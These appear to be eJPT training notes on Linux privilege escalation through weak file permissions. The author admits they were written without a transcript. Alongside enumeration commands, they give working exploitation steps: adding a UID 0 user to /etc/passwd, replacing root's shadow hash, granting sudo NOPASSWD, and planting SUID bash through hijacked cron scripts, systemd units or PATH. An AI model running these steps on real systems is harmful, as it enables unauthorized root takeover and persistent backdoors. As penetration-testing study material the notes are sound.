# 01 – Linux Privilege Escalation – Weak Permissions

Note: No transcript was provided. The following is a conservative, best-effort summary based on the filename and typical eJPT coverage for “Linux Privilege Escalation – Weak Permissions.” Adjust paths/commands to your lab environment.

## What the video covers (Introduction / big picture)
- How weak permissions (world-writable or group-writable files/directories owned by root) can be abused to escalate privileges.
- Key targets: /etc files (passwd/shadow/sudoers), cron jobs and scripts, systemd unit files, service/backup scripts, and PATH-related issues.
- Enumeration patterns to quickly spot weak permissions.
- Common exploitation patterns and safe practices for lab work.

## Flow (ordered)
1. Baseline triage (whoami, id, sudo -l, OS).
2. Enumerate weak permissions globally and in high-value locations.
3. Inspect cron/systemd for root tasks that call writable scripts.
4. Check /etc for dangerous write permissions (passwd, shadow, sudoers, crontab).
5. Check for world-writable directories in PATH or critical service directories.
6. Pick an exploitation route (e.g., writable /etc/passwd, cron script, service unit).
7. Execute exploitation (e.g., add UID 0 user, hijack a cron script).
8. Verify root, then cleanup (restore backups, remove SUIDs/users).
9. Document findings and remediation.

## Tools highlighted
- Built-in: find, ls/lsattr/stat, getfacl, grep, awk, sed, diff, vi/nano, cp/mv/chmod/chown
- Crypto/hash: openssl, mkpasswd (whois package), Python crypt
- Service/cron: systemctl, journalctl, crontab, pspy (process watcher; optional)
- Recon helpers: linpeas.sh / LinEnum.sh (optional)

## Typical command walkthrough (detailed, copy-paste friendly)

Baseline triage
```
whoami; id; uname -a
groups
sudo -l 2>/dev/null
echo $PATH
```

Quick enumeration: weak permissions (global)
```
# World-writable directories (watch for ones used by root processes)
find / -type d -perm -0002 -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -exec ls -ld {} \; 2>/dev/null

# World-writable files
find / -type f -perm -0002 -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -exec ls -l {} \; 2>/dev/null

# Root-owned and world-writable files (highest risk)
find / -type f -user root -perm -0002 -exec ls -l {} \; 2>/dev/null

# Writable files in /etc (very dangerous if found)
find /etc -type f -writable -ls 2>/dev/null

# Check for ACLs granting write
getfacl -R /etc 2>/dev/null | grep -E "^(# file:|user:|group:).*(w)"
```

Hot targets to audit
```
# Critical files
ls -l /etc/{passwd,shadow,sudoers,crontab}
stat -c "%a %n" /etc/{passwd,shadow,sudoers,crontab}

# Sudoers includes
ls -l /etc/sudoers.d 2>/dev/null

# Cron system-wide and per-user
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -l /var/spool/cron /var/spool/cron/crontabs 2>/dev/null

# Grep cron/systemd for scripts that may live in writable locations
grep -R --line-number -E "(sh|py|pl|exec|bin|backup)" /etc/cron* /etc/crontab /etc/cron.d 2>/dev/null
systemctl list-timers --all 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
```

Writable systemd units or scripts used by services
```
# Writable service units
find /etc/systemd/system /lib/systemd/system -type f -name "*.service" -writable -ls 2>/dev/null

# Writable scripts or directories referenced by services (ExecStart lines)
grep -R --line-number -E "ExecStart|ExecStartPre|ExecStartPost" /etc/systemd/system /lib/systemd/system 2>/dev/null
```

PATH-related checks
```
# List PATH directories with perms
IFS=: read -ra P <<< "$PATH"; for d in "${P[@]}"; do [ -d "$d" ] && ls -ld "$d"; done

# World-writable PATH dirs (potential PATH hijack if root tasks honor these dirs)
IFS=: read -ra P <<< "$PATH"; for d in "${P[@]}"; do [ -w "$d" ] && echo "[writable] $d"; done
```

Example exploitation patterns (for authorized lab environments)

1) Writable /etc/passwd (add a UID 0 user)
```
# Backup first
cp /etc/passwd /tmp/passwd.bak

# Generate a SHA-512 password hash (choose one method)
openssl passwd -6 'P@ssw0rd!' > /tmp/hash.txt
# or
mkpasswd -m sha-512 'P@ssw0rd!' > /tmp/hash.txt
# or
python3 - << 'PY'
import crypt
print(crypt.crypt("P@ssw0rd!", "$6$saltsalt$"))
PY

HASH=$(cat /tmp/hash.txt)

# Append a new root-equivalent user (UID 0, GID 0)
echo "sprivesc:${HASH}:0:0:root:/root:/bin/bash" | tee -a /etc/passwd

# Switch to it
su - sprivesc
id
```

2) Writable /etc/shadow (set root’s password hash)
```
# Backup first
cp /etc/shadow /tmp/shadow.bak

# Generate SHA-512 hash
HASH=$(openssl passwd -6 'P@ssw0rd!')

# Replace root's password field with our hash
sed -i "s|^root:[^:]*:|root:${HASH}:|" /etc/shadow

# Become root
su - root
```

3) Writable sudoers/sudoers.d (grant NOPASSWD to current user)
```
# Backup first
cp /etc/sudoers /tmp/sudoers.bak

# Append carefully; validate with visudo
ME=$(whoami)
echo "${ME} ALL=(ALL:ALL) NOPASSWD:ALL" | EDITOR='tee -a' visudo

# Use it
sudo -s
id
```

4) Root cron invoking a writable script (hijack the script)
```
# Identify a root cron job and the script it runs (example)
cat /etc/crontab
# Suppose it runs /usr/local/bin/backup.sh as root and that file is writable

# Backup script then replace payload
cp /usr/local/bin/backup.sh /tmp/backup.sh.bak
cat > /usr/local/bin/backup.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bashroot
chmod u+s /tmp/bashroot
EOF
chmod +x /usr/local/bin/backup.sh

# Wait for cron to run, then:
ls -l /tmp/bashroot
/tmp/bashroot -p
id
```

5) Writable systemd service unit or its script (persistence on restart)
```
# Find a writable service unit (example: /etc/systemd/system/app.service)
find /etc/systemd/system -type f -name "*.service" -writable -ls 2>/dev/null

# Backup then modify ExecStart to set SUID on /bin/bash
SVC=/etc/systemd/system/app.service
cp "$SVC" /tmp/app.service.bak
sed -i 's|^ExecStart=.*|ExecStart=/bin/bash -c "chmod u+s /bin/bash"|' "$SVC"

# When the service restarts (timer/reboot/crash/redeploy), you should get:
ls -l /bin/bash
/bin/bash -p -c 'id'
```

6) PATH hijack in a root-run script/cron (only if PATH is insecure and includes a writable dir first)
```
# Suppose a root cron/service runs: cp /some/file /somewhere (no absolute path)
# And suppose /usr/local/bin is before /bin in PATH and writable by you.

which cp
ls -ld /usr/local/bin
[ -w /usr/local/bin ] && echo "writable: /usr/local/bin"

cat > /usr/local/bin/cp << 'EOF'
#!/bin/bash
/bin/bash -c 'chmod u+s /bin/bash'
/bin/cp "$@"
EOF
chmod +x /usr/local/bin/cp

# Wait for root job to call 'cp' and then:
ls -l /bin/bash
/bin/bash -p -c 'id'
```

Cleanup (good practice in labs)
```
# Remove backdoors/SUID
chmod u-s /bin/bash /tmp/bashroot 2>/dev/null

# Restore backups if you changed system files
[ -f /tmp/passwd.bak ] && cp /tmp/passwd.bak /etc/passwd
[ -f /tmp/shadow.bak ] && cp /tmp/shadow.bak /etc/shadow
[ -f /tmp/app.service.bak ] && cp /tmp/app.service.bak /etc/systemd/system/app.service
[ -f /tmp/backup.sh.bak ] && cp /tmp/backup.sh.bak /usr/local/bin/backup.sh

# Remove added user line from /etc/passwd (example for 'sprivesc')
sed -i '/^sprivesc:/d' /etc/passwd
```

## Practical tips
- Always back up critical files (passwd, shadow, sudoers, service units, scripts) before editing.
- Validate sudoers with visudo to avoid locking out sudo.
- Prefer adding a temporary SUID on a non-critical file (e.g., /tmp/bashroot) rather than altering core binaries.
- Use absolute paths in payloads to avoid PATH surprises.
- Use -p flag with sh/bash to preserve effective UID in SUID shells.
- If uncertain how a root task gets triggered, use pspy to discover cron/timers without root access.
- Document exact paths, perms, and timestamps to support remediation.
- Remediation guidance: remove world-writable bits, fix ownership, pin absolute paths in scripts/services, restrict PATH, and apply least privilege.

## Minimal cheat sheet (one-screen flow)
```
# Baseline
whoami; id; sudo -l 2>/dev/null; echo $PATH

# Weak perms (global + /etc)
find / -type f -user root -perm -0002 -exec ls -l {} \; 2>/dev/null
find / -type d -perm -0002 -exec ls -ld {} \; 2>/dev/null
find /etc -type f -writable -ls 2>/dev/null
ls -l /etc/{passwd,shadow,sudoers,crontab}

# Cron/systemd inventory
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
systemctl list-timers --all 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
grep -R -nE 'ExecStart|\.sh|backup|sync' /etc/cron* /etc/crontab /etc/systemd/system /lib/systemd/system 2>/dev/null

# /etc/passwd privesc (if writable)
cp /etc/passwd /tmp/passwd.bak
HASH=$(openssl passwd -6 'P@ssw0rd!')
echo "sprivesc:${HASH}:0:0:root:/root:/bin/bash" | tee -a /etc/passwd
su - sprivesc

# Cron script privesc (example: /usr/local/bin/backup.sh)
cp /usr/local/bin/backup.sh /tmp/backup.sh.bak
printf '#!/bin/sh\ncp /bin/bash /tmp/bashroot; chmod u+s /tmp/bashroot\n' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
# wait, then:
 /tmp/bashroot -p
```

## Summary
- Weak permissions are a top-tier Linux privilege escalation vector: anything root executes that you can modify is a target.
- Enumerate world-writable files/dirs, especially under /etc, cron, systemd, and any scripts referenced by root tasks.
- Exploitation typically involves either modifying sensitive auth files (/etc/passwd or /etc/shadow), or hijacking root-executed scripts/services to grant a SUID shell.
- Keep changes reversible in labs: back up files, validate sudoers, and clean up afterward.
- If you lack specifics (as in this summary), stick to a disciplined enumeration flow and verify each finding before acting.